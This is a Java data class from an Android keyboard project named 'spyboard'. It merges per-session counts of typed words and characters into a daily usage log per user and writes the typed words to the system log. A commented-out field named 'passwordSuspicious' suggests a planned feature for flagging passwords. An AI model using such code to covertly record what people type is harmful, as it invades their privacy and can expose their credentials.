package com.idankorenisraeli.spyboard.data;

import android.util.Log;


import com.google.firebase.firestore.Exclude;
import com.idankorenisraeli.spyboard.common.TimeManager;

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import javax.annotation.Nonnull;

/**
 *
 * This class will sum all the usage of a single user in a single day.
 * When user finish a keyboard session, its data will be added to the daily log.
 *
 */
public class DailyUsageLog extends UsageLog implements Serializable {

    private String date;



    //private ArrayList<String> passwordSuspicious; TBD

    public DailyUsageLog(){
        this.date = TimeManager.getInstance().getDateOfToday();
    }

    public DailyUsageLog(String date){
        this.date = date;
    }


    /**
     * This method will take an existing session and add it into this one
     * @param session a single keyboard usage with a data of a single session
     */
    public void addLog(UsageLog session){

        Log.i("pttt", "Words: ----- "+  session.getWordFreq().entrySet().toString());
        for(Map.Entry<String, Integer> entry : session.getWordFreq().entrySet()) {
            Integer sessionSum = session.getWordFreq().getOrDefault(entry.getKey(), 0);
            if(sessionSum!=null)
                wordFreq.merge(entry.getKey(), entry.getValue(), Integer::sum);
        }

        for(String key : session.getCharFreq().keySet()) {
            Integer sessionSum = session.getCharFreq().getOrDefault(key, 0);
            if(sessionSum!=null)
                charFreq.merge(key, sessionSum, Integer::sum);
            Log.i("pttt", "Key: " + key + " new value " + charFreq.get(key));

        }

    }

    @Exclude
    public String getDate() {
        return date;
    }

    public void setDate(String date) {
        this.date = date;
    }


    /*
    public ArrayList<String> getPasswordSuspicious() {
        return passwordSuspicious;
    }

    public void setPasswordSuspicious(ArrayList<String> passwordSuspicious) {
        this.passwordSuspicious = passwordSuspicious;
    }
*/

}
